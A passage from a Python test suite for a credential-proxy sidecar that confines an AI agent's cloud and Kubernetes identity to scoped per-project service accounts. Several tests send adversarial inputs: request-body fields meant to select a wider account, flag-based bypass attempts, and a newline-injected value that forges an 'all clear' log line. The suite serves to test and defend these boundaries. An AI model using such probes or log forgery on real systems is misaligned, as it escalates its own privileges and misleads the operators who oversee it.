        authenticate as the ambient identity, so a test that omitted it would
        pass whether or not the swap happened.
        """
        stub_dir = Path(self.temp_dir.name) / "fake-bin"
        stub_dir.mkdir(parents=True, exist_ok=True)
        stub = stub_dir / "gcloud"
        stub.write_text(
            textwrap.dedent(
                """\
                #!/bin/bash
                set -u
                project=""; location=""; cluster=""
                for arg in "$@"; do
                    case "$arg" in
                        --project=*) project="${arg#--project=}" ;;
                        --location=*) location="${arg#--location=}" ;;
                        container|clusters|get-credentials|--*) ;;
                        *) [ -n "$cluster" ] || cluster="$arg" ;;
                    esac
                done
                ctx="gke_${project}_${location}_${cluster}"
                echo "$ctx" >> "$GET_CREDENTIALS_LOG"
                cat > "$KUBECONFIG" <<YAML
                apiVersion: v1
                kind: Config
                current-context: ${ctx}
                clusters:
                - name: ${ctx}
                  cluster:
                    server: https://198.51.100.1
                contexts:
                - name: ${ctx}
                  context:
                    cluster: ${ctx}
                    user: ${ctx}
                users:
                - name: ${ctx}
                  user:
                    exec:
                      apiVersion: client.authentication.k8s.io/v1beta1
                      command: gke-gcloud-auth-plugin
                YAML
                """
            ),
            encoding="utf-8",
        )
        stub.chmod(0o755)
        executor.executables["gcloud"] = str(stub)
        return executor

    def fake_kubectl(self, executor):
        """A kubectl that prints the kubeconfig it was actually given.

        Reading the file back out of the subprocess is what makes this a test of
        the join rather than of a helper: it fails if the credential is right in
        `_kubeconfig_for` and never reaches the process.
        """
        stub_dir = Path(self.temp_dir.name) / "fake-bin"
        stub_dir.mkdir(parents=True, exist_ok=True)
        stub = stub_dir / "kubectl"
        stub.write_text(
            '#!/bin/bash\necho "KUBECONFIG=$KUBECONFIG"\ncat "$KUBECONFIG"\n',
            encoding="utf-8",
        )
        stub.chmod(0o755)
        executor.executables["kubectl"] = str(stub)
        return executor

    def agent_context(self, cluster):
        """The pin a Cluster Agent profile forwards: a name, not a credential.

        The profile's kubeconfig stays in the agent's own pod; the shim reads
        `current-context` out of it there and sends this string.
        """
        return f"gke_{self.project_of(cluster)}_{self.LOCATION}_{cluster}"

    def test_a_read_against_a_mapped_cluster_runs_on_that_cluster_s_account(self):
        """The ordinary read, and the assertion that it changed identity.

        Both halves matter. Exit code 0 alone would pass with the ambient
        credential; the token alone would pass on a broker that had stopped
        working.
        """
        executor = self.executor(self.pool())
        result = executor.execute(
            ["kubectl", "get", "pods"],
            kubeconfig_context=self.agent_context(self.MAPPED),
        )
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertIn("token: TOKEN-1", result.stdout)
        self.assertEqual([self.EMAIL], self.minted)

    def test_the_exec_plugin_does_not_survive_into_the_subprocess(self):
        """Otherwise the ambient identity is still one kubectl preference away."""
        executor = self.executor(self.pool())
        result = executor.execute(
            ["kubectl", "get", "pods"],
            kubeconfig_context=self.agent_context(self.MAPPED),
        )
        self.assertNotIn("gke-gcloud-auth-plugin", result.stdout)
        self.assertNotIn("exec:", result.stdout)

    def test_a_second_cluster_in_the_mapped_project_runs_on_the_same_account(self):
        """One account per project, through the whole join.

        Two clusters in one project share a member by design
        (`multi-project-scope.md` §6). The per-cluster pool refused this
        request; the per-project one serves it on the project's account, and
        mints once for both clusters because the token cache is keyed on the
        member.
        """
        executor = self.executor(self.pool())
        for cluster in (self.MAPPED, "second-cluster"):
            result = executor.execute(
                ["kubectl", "get", "pods"],
                kubeconfig_context=f"gke_{self.PROJECT}_{self.LOCATION}_{cluster}",
            )
            self.assertEqual(0, result.exit_code, result.stderr)
            self.assertIn("token: TOKEN-1", result.stdout)
        self.assertEqual([self.EMAIL], self.minted)

    def test_an_unmapped_cluster_is_refused_and_nothing_runs(self):
        import scoped_sa_pool

        executor = self.executor(self.pool())
        with self.assertRaises(scoped_sa_pool.PoolRefusal):
            executor.execute(
                ["kubectl", "get", "pods"],
                kubeconfig_context=self.agent_context(self.UNMAPPED),
            )
        self.assertEqual([], self.minted)

    def test_the_refusal_happens_before_gke_is_asked_anything(self):
        """Order, asserted rather than commented.

        `_kubeconfig_for` selects and then materialises. Swapping the two lines
        leaves every other test in this class green -- the refusal still raises,
        just after a live `get-credentials` on the wide identity. The stubbed
        gcloud records the contexts it was asked for, so this fails when the
        order changes and nothing else does.

        The control below is what makes the empty log mean something: the same
        machinery on a mapped cluster does record a call.
        """
        import scoped_sa_pool

        executor = self.executor(self.pool())
        with self.assertRaises(scoped_sa_pool.PoolRefusal):
            executor.execute(
                ["kubectl", "get", "pods"],
                kubeconfig_context=self.agent_context(self.UNMAPPED),
            )
        self.assertEqual(
            [],
            self.gke_calls(),
            "get-credentials ran for a cluster the pool refused, on the ambient "
            "credential, before the refusal",
        )

        executor.execute(
            ["kubectl", "get", "pods"],
            kubeconfig_context=self.agent_context(self.MAPPED),
        )
        self.assertEqual(
            [f"gke_{self.PROJECT}_{self.LOCATION}_{self.MAPPED}"],
            self.gke_calls(),
            "the served request did not reach get-credentials either, so the "
            "empty log above says nothing about ordering",
        )

    def test_a_request_naming_no_kubeconfig_does_not_escape_onto_the_ambient_one(self):
        """`KUBECONFIG` is in the base environment, so "no kubeconfig" is a cluster.

        Without this branch a `kubectl get pods` with the field omitted runs
        against the sidecar's own kubeconfig and its exec plugin — the ambient
        identity, past the pool entirely. It is the one door the obvious
        implementation leaves open, and it is invisible: the command works.
        """
        import scoped_sa_pool

        executor = self.executor(self.pool())
        with self.assertRaises(scoped_sa_pool.PoolRefusal):
            executor.execute(["kubectl", "get", "pods"])

    def test_that_same_request_succeeds_once_the_default_cluster_is_in_the_pool(self):
        """The refusal above must be about the mapping, not about the path."""
        executor = self.executor(self.pool(projects=(self.PROJECT,)))
        managed = Path(executor.environment["KUBECONFIG"])
        managed.parent.mkdir(parents=True, exist_ok=True)
        managed.write_text(
            "apiVersion: v1\nkind: Config\n"
            f"current-context: gke_{self.PROJECT}_{self.LOCATION}_{self.MAPPED}\n",
            encoding="utf-8",
        )
        result = executor.execute(["kubectl", "get", "pods"])
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertIn("token: TOKEN-1", result.stdout)

    def host_context_executor(self, pool, context):
        """An executor built with the operator's host-cluster pin in place.

        Read in `__init__`, so the environment has to be patched around
        construction rather than assigned afterwards.
        """
        with mock.patch.dict(os.environ, {"KUBE_CONTEXT_NAME": context}):
            return self.executor(pool)

    def test_the_host_context_beats_a_base_kubeconfig_that_has_drifted(self):
        """The pin is what makes the default survive a rewrite of that file.

        The base kubeconfig names a cluster the pool does not cover, which is
        what `get-credentials` for another cluster used to leave behind. Reading
        the file refuses; reading the environment runs. Asserted through the
        mint, because a refusal and a mint for the wrong cluster both come back
        as "it did not work" otherwise.
        """
        executor = self.host_context_executor(
            self.pool(), f"gke_{self.PROJECT}_{self.LOCATION}_{self.MAPPED}"
        )
        self.ambient_kubeconfig(executor, self.UNMAPPED)
        result = executor.execute(["kubectl", "get", "pods"])
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertEqual([self.EMAIL], self.minted)

    def test_without_a_host_context_the_base_kubeconfig_still_answers(self):
        """A broker started outside the operator keeps the old behaviour."""
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("KUBE_CONTEXT_NAME", None)
            executor = self.executor(self.pool())
        self.ambient_kubeconfig(executor, self.MAPPED)
        result = executor.execute(["kubectl", "get", "pods"])
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertEqual([self.EMAIL], self.minted)

    def test_a_host_context_that_is_not_a_gke_name_falls_back(self):
        """`minikube` is a legitimate context and names no GKE cluster.

        Trusting it blindly would strand the ambient path on a value
        `parse_gke_context` cannot use, refusing every request that names no
        cluster.
        """
        executor = self.host_context_executor(self.pool(), "minikube")
        self.ambient_kubeconfig(executor, self.MAPPED)
        result = executor.execute(["kubectl", "get", "pods"])
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertEqual([self.EMAIL], self.minted)

    def test_the_kubeconfig_flag_goes_through_selection_too(self):
        """`--kubeconfig` outranks the environment in kubectl.

        Closing only the forwarded field would leave the flag as the way round
        the pool, exactly as it was the way round `_resolve_kubeconfig`.

        The ambient kubeconfig is pointed at a **mapped** cluster on purpose. An
        earlier version of this test left it unset, so a broker that ignored the
        flag entirely still refused -- at the ambient path, for an unrelated
        reason -- and the test passed with the flag rewrite deleted. Here,
        ignoring the flag succeeds and only honouring it refuses.
        """
        import scoped_sa_pool

        executor = self.executor(self.pool())
        self.ambient_kubeconfig(executor, self.MAPPED)
        with self.assertRaises(scoped_sa_pool.PoolRefusal):
            executor.execute(
                [
                    "kubectl",
                    f"--kubeconfig={self.agent_context(self.UNMAPPED)}",
                    "get",
                    "pods",
                ]
            )

    def test_a_flag_naming_a_mapped_cluster_is_not_refused_by_the_ambient_one(self):
        """The other side of the flag, and an availability bug it caught.

        `execute` branched on the request's `kubeconfig` field alone, so a
        request that named its cluster in argv fell through to the ambient
        default and selected a *second* cluster. With the sidecar's own
        kubeconfig naming something the pool does not cover, every flag-pinned
        request to a mapped cluster was refused with "this request names no
        cluster" -- after minting a token for the cluster it did name.

        One mint, for the cluster the request asked about, and it runs.
        """
        executor = self.executor(self.pool())
        self.ambient_kubeconfig(executor, self.UNMAPPED)
        result = executor.execute(
            [
                "kubectl",
                f"--kubeconfig={self.agent_context(self.MAPPED)}",
                "get",
                "pods",
            ]
        )
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertIn("token: TOKEN-1", result.stdout)
        self.assertEqual([self.EMAIL], self.minted)

    def test_a_flag_pinned_request_selects_once(self):
        """Two selections for one request is not two controls.

        Both projects mapped, so the old behaviour did not refuse -- it minted
        twice, once for the cluster argv named and once for the sidecar's, and
        used the first. A test that only checked the exit code saw nothing.
        """
        executor = self.executor(self.pool(projects=(self.PROJECT, self.OTHER_PROJECT)))
        self.ambient_kubeconfig(executor, self.UNMAPPED)
        executor.execute(
            [
                "kubectl",
                f"--kubeconfig={self.agent_context(self.MAPPED)}",
                "get",
                "pods",
            ]
        )
        self.assertEqual(
            1,
            len(self.minted),
            f"one request minted {len(self.minted)} tokens: {self.minted}",
        )

    def test_the_flag_beats_the_forwarded_environment(self):
        """kubectl prefers --kubeconfig over KUBECONFIG, so selection must too.

        The common shape on a real install: the profile exports KUBECONFIG,
        the client forwards it as the request field, and argv also carries a
        flag. The flag's cluster is the one kubectl reads, so a request whose
        flag names a mapped cluster must not be refused because the
        *environment's* cluster is unmapped -- and must not mint twice when
        both are mapped.
        """
        executor = self.executor(self.pool())
        result = executor.execute(
            [
                "kubectl",
                f"--kubeconfig={self.agent_context(self.MAPPED)}",
                "get",
                "pods",
            ],
            kubeconfig_context=self.agent_context(self.UNMAPPED),
        )
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertEqual(
            [self.EMAIL],
            self.minted,
            "the flag named a mapped cluster; the environment's unmapped one "
            "must neither refuse the request nor mint a token of its own",
        )

    def test_the_scoped_kubeconfig_is_not_readable_by_the_agent(self):
        """It holds a bearer token for a cloud identity.

        Two properties, and the mode is the weaker one: the file is under the
        sidecar-only state dir rather than the shared workspace, so the agent has
        no path to it at all. The mode is asserted because the process umask is
        0002 for the shared-volume writes, and a token file inheriting that would
        be group-readable by the group the agent is in.
        """
        executor = self.executor(self.pool())
        executor.execute(
            ["kubectl", "get", "pods"],
            kubeconfig_context=self.agent_context(self.MAPPED),
        )
        scoped = list(executor.kubeconfig_dir.glob("*.scoped.yaml"))
        self.assertEqual(1, len(scoped), f"expected one scoped kubeconfig, got {scoped}")
        self.assertEqual(0o600, scoped[0].stat().st_mode & 0o777)
        self.assertFalse(
            str(scoped[0]).startswith(str(executor.workspace_dir)),
            "the scoped kubeconfig is on the volume the agent writes",
        )

    def test_the_ambient_path_is_unchanged_when_the_pool_is_off(self):
        """The rollback has to be a real rollback."""
        executor = self.executor(None)
        result = executor.execute(
            ["kubectl", "get", "pods"],
            kubeconfig_context=self.agent_context(self.UNMAPPED),
        )
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertIn("gke-gcloud-auth-plugin", result.stdout)
        self.assertEqual([], self.minted)

    def test_gcloud_with_a_forwarded_kubeconfig_stays_on_the_ambient_identity(self):
        """The client forwards KUBECONFIG for gcloud too, and an agent always
        has one exported -- so this is every gcloud call on a real install,
        not an edge. Only kubectl changes identity: a forwarded kubeconfig
        naming an unmapped cluster must not refuse a cloud-API read that has
        nothing to do with Kubernetes objects, and one naming a mapped
        cluster must not mint a token gcloud will never use.
        """
        executor = self.executor(self.pool())
        for cluster in (self.UNMAPPED, self.MAPPED):
            result = executor.execute(
                ["gcloud", "logging", "read", "severity>=ERROR"],
                kubeconfig_context=self.agent_context(cluster),
            )
            self.assertEqual(0, result.exit_code, result.stderr)
        self.assertEqual([], self.minted)

    def test_a_kubeconfig_flag_on_a_non_kubectl_argv_does_not_reach_selection(self):
        """git has no --kubeconfig flag of its own, so an agent-composed one
        must not be the token that walks a git request into pool selection.
        The real git would reject the flag; the property here is that the
        broker neither minted nor refused before it got the chance to.
        """
        executor = self.executor(self.pool())
        stub_dir = Path(self.temp_dir.name) / "fake-bin"
        stub_dir.mkdir(parents=True, exist_ok=True)
        stub = stub_dir / "git"
        stub.write_text("#!/bin/bash\ntrue\n", encoding="utf-8")
        stub.chmod(0o755)
        executor.executables["git"] = str(stub)
        executor.execute(
            [
                "git",
                "status",
                f"--kubeconfig={self.agent_context(self.MAPPED)}",
            ]
        )
        self.assertEqual([], self.minted)

    def test_git_and_gh_do_not_mint_a_cloud_token(self):
        """They authenticate to GitHub. A GCP token for them would be pure blast radius."""
        executor = self.executor(self.pool())
        stub_dir = Path(self.temp_dir.name) / "fake-bin"
        for name in ("git", "gh"):
            stub = stub_dir / name
            stub.write_text("#!/bin/bash\ntrue\n", encoding="utf-8")
            stub.chmod(0o755)
            executor.executables[name] = str(stub)
        executor.execute(["gh", "pr", "view", "1"])
        self.assertEqual([], self.minted)

    def test_an_unparameterised_executor_takes_the_pool_from_the_environment(self):
        """The executor reads the pool from the environment, and this is that line.

        Every other test in this class injects a pool, so deleting the
        `build_pool()` call in `__init__` would leave them all green while a
        deployed broker silently ran ambient.
        """
        pool_file = Path(self.temp_dir.name) / "pool.json"
        pool_file.write_text(
            json.dumps(
                {
                    "version": 2,
                    "serviceAccounts": [
                        {"projectId": self.PROJECT, "serviceAccountEmail": self.EMAIL}
                    ],
                }
            ),
            encoding="utf-8",
        )
        with mock.patch.dict(
            os.environ,
            {
                # Armed explicitly since 2026-08-12. The flag defaults off while
                # pool members hold no authority, so the environment this test
                # is about has to be spelled out rather than assumed.
                "CREDENTIAL_PROXY_SCOPED_SA_POOL": "1",
                "CREDENTIAL_PROXY_SCOPED_SA_POOL_FILE": str(pool_file),
            },
        ):
            executor = CommandExecutor(
                timeout_seconds=5,
                max_output_bytes=1024,
                state_dir=str(Path(self.temp_dir.name) / "auto"),
            )
        self.assertIsNotNone(executor.scoped_pool)
        self.assertEqual([self.PROJECT], executor.scoped_pool.scopes)


class ScopedServiceAccountOverTheSocketTest(unittest.TestCase):
    """A refusal has to arrive as a refusal, over the wire.

    Two separate claims live here. That an unmapped cluster is answered 403 with
    its own rule id rather than as an unexplained 500 — an operator reading that
    log has to be able to tell a missing pool entry from a broken broker. And
    that nothing in the request body can choose the account, checked where it
    matters: at the edge, against a body an agent could really send.
    """

    PROJECT = "kagents-dev"
    OTHER_PROJECT = "kagents-other"
    LOCATION = "us-east4"
    MAPPED = "mapped-cluster"
    EMAIL = "ka-kagents-dev-1a2b3c4d@kagents-host.iam.gserviceaccount.com"
    WIDE = "kubeagents-platform-gsa@kagents-dev.iam.gserviceaccount.com"

    def setUp(self):
        import scoped_sa_pool

        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.minted = []

        def minter(account, lifetime):
            self.minted.append(account)
            return "TOKEN", 1_000_000.0

        members = scoped_sa_pool.parse_pool(
            {
                "version": 2,
                "serviceAccounts": [
                    {"projectId": self.PROJECT, "serviceAccountEmail": self.EMAIL}
                ],
            }
        )
        pool = scoped_sa_pool.ScopedServiceAccountPool(
            members, minter=minter, clock=lambda: 0.0
        )

        policy_path = Path(self.temp_dir.name) / "policy.json"
        policy_path.write_text(json.dumps({"rules": []}), encoding="utf-8")

        self.saved = {
            name: CredentialProxyHandler.__dict__.get(name)
            for name in ("policy", "executor", "enforce_read_only", "max_request_bytes")
        }
        CredentialProxyHandler.policy = Policy.load(str(policy_path))
        CredentialProxyHandler.executor = CommandExecutor(
            timeout_seconds=10,
            max_output_bytes=1 << 16,
            state_dir=str(Path(self.temp_dir.name) / "state"),
            scoped_pool=pool,
        )
        CredentialProxyHandler.max_request_bytes = 65536
        CredentialProxyHandler.enforce_read_only = False
        self.addCleanup(self._restore)

        # Stubbed here rather than per-test. `execute` refuses an unavailable
        # executable before it reaches the pool, so an unstubbed kubectl makes
        # every refusal below pass for the wrong reason — a 500 that looks like
        # a rejection if the assertion only checked "not 200".
        self.stub_dir = Path(self.temp_dir.name) / "fake-bin"
        self.stub_dir.mkdir(parents=True, exist_ok=True)
        kubectl = self.stub_dir / "kubectl"
        kubectl.write_text('#!/bin/bash\ncat "$KUBECONFIG"\n', encoding="utf-8")
        kubectl.chmod(0o755)
        CredentialProxyHandler.executor.executables["kubectl"] = str(kubectl)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.base = f"http://127.0.0.1:{self.server.server_address[1]}"

    def _restore(self):
        for name, value in self.saved.items():
            if value is None:
                if name in CredentialProxyHandler.__dict__:
                    delattr(CredentialProxyHandler, name)
            else:
                setattr(CredentialProxyHandler, name, value)

    def context_naming(self, cluster, project=None):
        return f"gke_{project or self.PROJECT}_{self.LOCATION}_{cluster}"

    def stub_gcloud(self, context):
        """A `get-credentials` that writes a kubeconfig for `context`.

        Served requests reach gcloud before kubectl; the refusals above do not,
        which is why setUp stubs only kubectl.
        """
        gcloud = self.stub_dir / "gcloud"
        gcloud.write_text(
            textwrap.dedent(
                f"""\
                #!/bin/bash
                ctx="{context}"
                printf 'apiVersion: v1\\nkind: Config\\ncurrent-context: %s\\nusers:\\n- name: %s\\n  user:\\n    exec:\\n      command: gke-gcloud-auth-plugin\\n' "$ctx" "$ctx" > "$KUBECONFIG"
                """
            ),
            encoding="utf-8",
        )
        gcloud.chmod(0o755)
        CredentialProxyHandler.executor.executables["gcloud"] = str(gcloud)

    def unmapped_context(self):
        """A cluster in a project the pool has no member for.

        The pool is keyed on the project, so an unknown cluster *name* in the
        mapped project is served; the refusal needs a project with no entry.
        """
        return self.context_naming("nowhere-cluster", project=self.OTHER_PROJECT)

    def post(self, body):
        request = urllib.request.Request(
            f"{self.base}/v1/exec",
            data=json.dumps(body).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=20) as response:
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as error:
            return error.code, json.loads(error.read())

    def test_an_unmapped_cluster_is_answered_as_a_refusal_not_a_fault(self):
        status, body = self.post(
            {
                "requestId": "r1",
                "argv": ["kubectl", "get", "pods"],
                "kubeconfigContext": self.unmapped_context(),
            }
        )
        self.assertEqual(403, status, body)
        self.assertEqual("gcp.scoped-sa.unmapped-scope", body.get("rule"), body)
        self.assertIn(f"project {self.OTHER_PROJECT} ", body.get("message", ""))
        self.assertIn(
            f"projects/{self.OTHER_PROJECT}/locations/{self.LOCATION}/clusters/nowhere-cluster",
            body.get("message", ""),
        )

    def test_an_unknown_cluster_name_in_a_mapped_project_is_served(self):
        """The refusal above is about the project, not the cluster name.

        Without this the previous case passes on a pool still keyed per
        cluster, and the fleet's second cluster in every project is refused.
        """
        self.stub_gcloud(self.context_naming("nowhere-cluster"))
        status, body = self.post(
            {
                "requestId": "r1b",
                "argv": ["kubectl", "get", "pods"],
                "kubeconfigContext": self.context_naming("nowhere-cluster"),
            }
        )
        self.assertEqual(200, status, body)
        self.assertEqual([self.EMAIL], self.minted)

    # The vocabulary the /v1/exec handler reads out of the request body. Six
    # keys. Pinned here because the test below used to be a denylist of seven
    # field names I guessed an attacker might try, and a denylist that misses
    # the actual key is worse than none: a hole reading `payload.get("context")`
    # would have passed all 169 tests.
    #
    # `kubeconfigContext` does name a cluster, and it is the one field that has
    # to: the proxy holds no other way to know which of a fleet a request is
    # for. It is safe because naming a cluster is not choosing an account —
    # `scoped_sa_pool` maps the name to an account, and a name with no entry is
    # the refusal below rather than a fallback to the wide one.
    EXEC_BODY_KEYS = {
        "argv",
        "cwd",
        "kubeconfigContext",
        "requestId",
        "stdin",
        "wantsKubeconfig",
    }

    def test_the_exec_handler_reads_no_field_this_test_has_not_seen(self):
        """The allowlist behind the denylist below, read off the handler itself.

        Enumerating what `do_POST` takes out of the parsed body turns "no field
        chooses the account" from a guess into a closed set. A new key is a
        failure here rather than a hole nobody thought to probe for, and the
        person adding one has to say in this list why it cannot name an
        identity.
        """
        source = Path(credential_proxy.__file__).read_text(encoding="utf-8")
        # Anchored on the class, because AgentAPIProxyHandler has a do_POST too
        # and it is the wrong one -- it forwards rather than parsing a body.
        cls = source.index("class CredentialProxyHandler(")
        start = source.index("    def do_POST(self)", cls)
        end = source.index("\n    def ", start + 10)
        handler = source[start:end]
        keys = set(re.findall(r'payload\.get\(\s*"([^"]+)"', handler)) | set(
            re.findall(r'payload\[\s*"([^"]+)"\s*\]', handler)
        )
        self.assertTrue(keys, "could not find the request body reads in do_POST")
        self.assertEqual(
            self.EXEC_BODY_KEYS,
            keys,
            "the /v1/exec request body has grown a field. If it can name a "
            "cluster, a scope, a context or an account, it is a way for the "
            "agent to pick its own credential and the pool is decorative.",
        )

    def test_a_refusal_cannot_forge_a_log_record(self):
        """The refusal message carries a scope the agent wrote.

        The scope key is built from the context name in the request body, and it
        lands in a WARNING. Logged raw, a newline in that value splits one
        record into two and the second one says whatever the agent wanted it to
        say. The ValueError handler beside this one already sanitises for
        exactly this reason.

        The component regex now refuses a newline outright, so this is the
        second of the two locks: it stays true if someone loosens the pattern.
        """
        forged = (
            "gke_kagents-dev_us-east4_nowhere\n"
            "2026-01-01 00:00:00 INFO credential-proxy all clear"
        )

        with self.assertLogs("credential-proxy", level="WARNING") as logs:
            status, body = self.post(
                {
                    "requestId": "r4",
                    "argv": ["kubectl", "get", "pods"],
                    "kubeconfigContext": forged,
                }
            )
        self.assertIn(status, (400, 403), body)
        for record in logs.output:
            self.assertNotIn("\n", record, f"a log record carries a newline: {record!r}")
        # The refusal names what it refused, which is right -- the agent's text
        # appearing inside a quoted, escaped `reason=` is the diagnostic. What
        # must not happen is it appearing as a record of its own.
        forged_records = [line for line in logs.output if line.startswith("INFO")]
        self.assertEqual([], forged_records, logs.output)

    def test_the_refusal_message_is_sanitised_before_it_is_logged(self):
        """Belt and braces on the handler itself, independent of the regex.

        Driven by raising the exception the handler catches, so it holds even
        if every upstream validator is loosened. Without
        `_sanitize_for_logging` here this is two records.
        """
        import scoped_sa_pool

        def refuse(*args, **kwargs):
            raise scoped_sa_pool.PoolRefusal(
                "no scoped service account is provisioned for projects/p/locations/l/clusters/c\n"
                "2026-01-01 00:00:00 INFO credential-proxy forged"
            )

        with mock.patch.object(CredentialProxyHandler.executor, "execute", refuse):
            with self.assertLogs("credential-proxy", level="WARNING") as logs:
                status, body = self.post(
                    {"requestId": "r5", "argv": ["kubectl", "get", "pods"]}
                )
        self.assertEqual(403, status, body)
        refusals = [line for line in logs.output if "scoped service account refused" in line]
        self.assertEqual(1, len(refusals), logs.output)
        self.assertNotIn("\n", refusals[0], refusals[0])
        self.assertIn("forged", refusals[0], "the message was truncated rather than sanitised")

    def test_the_refusal_is_logged_whole_at_the_longest_names(self):
        """The log cap on the refusal is sized against the message, not a default.

        A real refusal built by `select` at the bound `_name_component` enforces
        on every component. If the WARNING is cut before the remedy, the
        operator reading the log is left without the fix the message exists
        to carry.
        """
        import scoped_sa_pool

        longest = "a" * scoped_sa_pool.MAX_NAME_COMPONENT_LENGTH
        pool = CredentialProxyHandler.executor.scoped_pool

        def refuse(*args, **kwargs):
            pool.select(longest, longest, longest)

        with mock.patch.object(CredentialProxyHandler.executor, "execute", refuse):
            with self.assertLogs("credential-proxy", level="WARNING") as logs:
                status, body = self.post(
                    {"requestId": "r6", "argv": ["kubectl", "get", "pods"]}
                )
        self.assertEqual(403, status, body)
        refusals = [line for line in logs.output if "scoped service account refused" in line]
        self.assertEqual(1, len(refusals), logs.output)
        self.assertTrue(
            refusals[0].endswith("or exclude the cluster."),
            f"the refusal was truncated before its remedy: {refusals[0]!r}",
        )

    def test_the_request_body_cannot_choose_the_account(self):
        """The request body is data, not configuration.

        Every field an agent might reasonably try, sent alongside a kubeconfig
        naming a cluster that has no pool entry. If any of them were read, the
        answer would be a 200 or a mint of the wide account. The assertion is
        that the refusal is unmoved and nothing was minted at all — a weaker
        check on status alone would pass against a broker that honoured the
        field and happened to fail later.

        This is the probe, not the proof; the closed-vocabulary test above is
        what makes the set exhaustive. Kept because it exercises the real socket
        against a real body, and because the four context-shaped names were the
        gap that showed the denylist could not be the whole answer.
        """
        for field, value in (
            ("serviceAccount", self.WIDE),
            ("serviceAccountEmail", self.WIDE),
            ("scope", f"projects/{self.PROJECT}/locations/{self.LOCATION}/clusters/{self.MAPPED}"),
            ("clusterName", self.MAPPED),
            ("projectId", self.PROJECT),
            ("impersonate", self.WIDE),
            ("gsa", self.WIDE),
            ("context", f"gke_{self.PROJECT}_{self.LOCATION}_{self.MAPPED}"),
            ("currentContext", f"gke_{self.PROJECT}_{self.LOCATION}_{self.MAPPED}"),
            ("cluster", self.MAPPED),
            ("target", f"projects/{self.PROJECT}/locations/{self.LOCATION}/clusters/{self.MAPPED}"),
        ):
            with self.subTest(field=field):
                self.minted.clear()
                status, body = self.post(
                    {
                        "requestId": "r2",
                        "argv": ["kubectl", "get", "pods"],
                        "kubeconfigContext": self.unmapped_context(),
                        field: value,
                    }
                )
                self.assertEqual(403, status, body)
                self.assertEqual("gcp.scoped-sa.unmapped-scope", body.get("rule"), body)
                self.assertEqual([], self.minted)

    def test_a_body_naming_the_wide_account_still_mints_only_the_scoped_one(self):
        """The positive half: a served request is served by the mapped account.

        The refusal cases above would all pass on a broker that ignored the pool
        and failed for some other reason, so this asserts the account actually
        used on a request that succeeds.
        """
        self.stub_gcloud(self.context_naming(self.MAPPED))
        status, body = self.post(
            {
                "requestId": "r3",
                "argv": ["kubectl", "get", "pods"],
                "kubeconfigContext": self.context_naming(self.MAPPED),
                "serviceAccount": self.WIDE,
            }
        )
        self.assertEqual(200, status, body)
        self.assertEqual(0, body["exitCode"], body)
        self.assertIn("token: TOKEN", body["stdout"])
        self.assertEqual([self.EMAIL], self.minted)



class ChatRelaySubscriptionsTest(unittest.TestCase):
    def test_two_relays_on_one_subscription_are_refused_at_startup(self):
        environment = {
            "GOOGLE_CHAT_SUBSCRIPTION_NAME": "projects/p/subscriptions/one",
            "A2A_GOOGLE_CHAT_SUBSCRIPTION_NAME": "projects/p/subscriptions/one",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertRaises(RuntimeError):
                credential_proxy.chat_relay_subscriptions("p")

    def test_distinct_or_single_subscriptions_pass_through(self):
        with mock.patch.dict(
            os.environ,
            {"GOOGLE_CHAT_SUBSCRIPTION_NAME": "a", "A2A_GOOGLE_CHAT_SUBSCRIPTION_NAME": "b"},
            clear=True,
        ):
            self.assertEqual(credential_proxy.chat_relay_subscriptions("p"), ("a", "b"))
        with mock.patch.dict(os.environ, {"A2A_GOOGLE_CHAT_SUBSCRIPTION_NAME": "b"}, clear=True):
            self.assertEqual(credential_proxy.chat_relay_subscriptions("p"), ("", "b"))

    def test_a_short_name_and_its_qualified_spelling_are_one_subscription(self):
        environment = {
            "GOOGLE_CHAT_SUBSCRIPTION_NAME": "chat-sub",
            "A2A_GOOGLE_CHAT_SUBSCRIPTION_NAME": "projects/p/subscriptions/chat-sub",
        }
        with mock.patch.dict(os.environ, environment, clear=True):
            with self.assertRaises(RuntimeError):
                credential_proxy.chat_relay_subscriptions("p")
        # Same short name in another project is a different subscription.
        with mock.patch.dict(os.environ, environment, clear=True):
            self.assertEqual(
                credential_proxy.chat_relay_subscriptions("q"),
                ("chat-sub", "projects/p/subscriptions/chat-sub"),
            )

class RepositoryRoleTest(unittest.TestCase):
    """Which list a repository is in decides what its clone presents, and nothing else."""

    def setUp(self):
        # Both lists are cached for thirty seconds; each test here reads its own.
        for attribute in ("_managed_repository_cache", "_context_repository_cache"):
            patcher = mock.patch.object(credential_proxy, attribute, None)
            patcher.start()
            self.addCleanup(patcher.stop)

    def _lists(self, managed=(), context=()):
        stack = contextlib.ExitStack()
        stack.enter_context(
            mock.patch("gitops_workspace.get_managed_repo_keys", return_value=[f"github:github.com/{r}".lower() for r in managed])
        )
        stack.enter_context(
            mock.patch("gitops_workspace.get_context_repo_keys", return_value=[f"github:github.com/{r}".lower() for r in context])
        )
        return stack

    def test_managed_wins_context_is_second_and_neither_is_unregistered(self):
        with self._lists(managed=["acme/gitops"], context=["acme/gitops", "acme/tf-live"]):
            self.assertEqual("managed", credential_proxy.repository_role("acme/gitops"))
            # Case-insensitive on both sides, as `repository_is_managed` is.
            self.assertEqual("context", credential_proxy.repository_role("Acme/TF-Live"))
            self.assertEqual("unregistered", credential_proxy.repository_role("someone/else"))

    def test_an_unreadable_context_list_raises_rather_than_answering(self):
        with mock.patch("gitops_workspace.get_managed_repo_keys", return_value=[]):
            with mock.patch(
                "gitops_workspace.get_context_repo_keys",
                side_effect=RuntimeError("kubectl exited 1"),
            ):
                with self.assertRaises(RuntimeError):
